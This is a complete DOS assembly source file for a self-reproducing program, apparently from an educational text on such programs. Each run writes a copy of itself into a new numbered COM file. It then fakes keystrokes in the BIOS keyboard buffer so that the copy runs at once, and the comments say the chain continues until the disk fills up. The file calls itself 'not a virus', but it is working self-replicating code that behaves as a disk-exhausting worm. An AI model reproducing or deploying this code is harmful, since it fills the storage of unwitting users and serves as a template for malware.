

;----------------------------------------------------------------------------
;               The Self-Reproducing Automaton Two
;----------------------------------------------------------------------------
;This program is a basic self-reproducing automaton that is not a virus. It
;just copies itself into another COM file (the offspring) which did
;not exist on disk prior to execution of the program. Then, it puts the name
;of that offspring in the keyboard buffer so that it gets executed by the
;command processor as soon as the automaton finishes executing. In this way,
;the parent creates its offspring and causes it to execute. Then the offspring
;creates an offspring of its own, and the cycle continues until the disk gets
;filled up and no more offspring can be created.


;----------------------------------------------------------------------------
;This segment is set up at 0040:0000 in absolute memory. That is the BIOS data
;storage area, which contains the BIOS's keyboard buffer. This program uses the
;buffer to create fake keystrokes in order to execute the offspring of the
;automaton after the automaton finishes processing.

BIOS_DATA      SEGMENT AT 0040H

KOFFSET         EQU     0017H           ;offset of keybd data in this segment
KBUFSIZE        EQU     10H             ;keyboard buffer size, in words

FILLER          DB      KOFFSET dup (?) ;filler to get to start of keybd data
FLAGS_1         DB      ?               ;First keyboard status byte
FLAGS_2         DB      ?               ;Second keyboard status byte
RESERVED        DB      ?               ;Byte reserved for future use
HEAD            DW      ?               ;Buffer head pointer
TAIL            DW      ?               ;Buffer tail pointer
KB_BUFFER       DW      KBUFSIZE dup (?);Key code buffer

BIOS_DATA      ENDS


;-----------------------------------------------------------------------------
;This is the main code segment of the program, which is a COM file.

MAIN    SEGMENT BYTE
        ASSUME  CS:MAIN,DS:MAIN,SS:MAIN

        ORG     100H                    ;start location for a COM file

START:
        call    NEWFILE                         ;get a new com file name and put it at COMFILE
        call    MOVE_AUTO                       ;and create a new automaton
        call    FILL_BUFFER                     ;and prep to call it when this program exits
EXITA:
        int     20H                             ;exit program using DOS


;--------------------------------------------------------------------------
; NEWFILE
; -------
;Generate a new file name which is not currently in use. This name will be
;an 8 digit number with the extent "COM". This routine essentially just
;increments that 8 digit ascii number, which is stored at the location
;COMFILE. There is no guarantee that such a name is not already in use, but
;an 8 digit number would be a strange name for a COM file, so it is highly
;unlikely that it is already there. If it does exist, the copy routine will
;overwrite it anyhow. That is good enough for this program's purposes.
;
NEWFILE:
        mov     bx,OFFSET COMFILE + 7           ;get the address of the least significant digit
        inc     bx                              ;prepare for next line on the first loop
NEW1:   dec     bx                              ;go to next digit
        mov     al,BYTE PTR [bx]                ;get that digit in al
        cmp     al,'9'                          ;is it a 9?
        je      NEW2                            ;yes - go handle it
        inc     BYTE PTR [bx]                   ;no, so increment the digit by 1
        ret                                     ;and exit
NEW2:   mov     BYTE PTR [bx],'0'               ;was a 9 - turn it into a 0
        jmp     NEW1                            ;and go examine a more significant digit


;--------------------------------------------------------------------------
; MOVE_AUTO
; ---------
;Put this program code (which is in memory when this is being executed) into
;the file whose name appears in COMFILE. In order to do this, we must create
;that file, write the code to it, and then close it.
;
MOVE_AUTO:
        mov     dx,OFFSET COMFILE               ;ds:dx points to the name of the file
        mov     ah,5BH                          ;DOS create function
        xor     cx,cx                           ;use standard file attributes
        int     21H                             ;and go create it
        jc      MAE                             ;error opening file, so exit
        push    ax                              ;otherwise, save the file handle on the stack

        mov     cx,OFFSET FINAL - 100H          ;cx=number of bytes to write
        mov     dx,100H                         ;ds:dx = buffer in memory to write from
        mov     bx,ax                           ;put the file handle in bx
        mov     ah,40H                          ;DOS write function
        int     21H

        pop     bx                              ;get the file handle again
        mov     ah,3EH                          ;and close file
        int     21H                             ;using DOS
MAE:    ret                                     ;done with reproduction


;--------------------------------------------------------------------------
; FILL_BUFFER
; -----------
;This function fills the keyboard buffer which the BIOS maintains with the
;name of the offspring of the automaton, and a carriage return. This means
;that the offspring will be loaded into memory and executed immediately, as
;soon as this automaton terminates and returns to the command interpreter.
;It will look just like you had typed in the offspring's name at the command
;prompt.
;
;This is an essential function since without it, the offspring will be some
;odd looking COM file out there which nobody in their right mind would execute.
;Thus, reproduction would stop because the program that does the reproducing
;would simply never get executed.
;
FILL_BUFFER:
        mov     ax,SEG BIOS_DATA
        mov     es,ax                           ;set up the segment for the BIOS data buffer
        mov     es:[HEAD],OFFSET KB_BUFFER      ;initialize keyboard buffer head and tail pointers
        mov     es:[TAIL],OFFSET KB_BUFFER + 18 ;this tells BIOS that there are 9 characters ready
        mov     di,OFFSET KB_BUFFER             ;set up si and di to do the data transfer
        mov     si,OFFSET COMFILE
        mov     cx,8                            ;first do the 8 characters in the file name
        mov     ah,32                           ;use a dummy scan code
FBL:    lodsb                                   ;and load a character from COMFILE name
        stosw                                   ;and store char/scan code in the keyboard buffer
        loop    FBL                             ;loop until all 8 characters are done
        mov     al,0DH                          ;finally, put the carriage return in
        stosw
        ret


;This is where the name of the COM file which is created by this program gets
;stored. The program modifies the contents of this name, which is set to
;00000000.COM here for initialization only. Each new generation will have
;a new value here, stored on disk.

COMFILE DB      '00000000.COM',0

FINAL:                                          ;label for last byte of code to be kept in the copy
                                                ;of the automaton
MAIN    ENDS


        END START

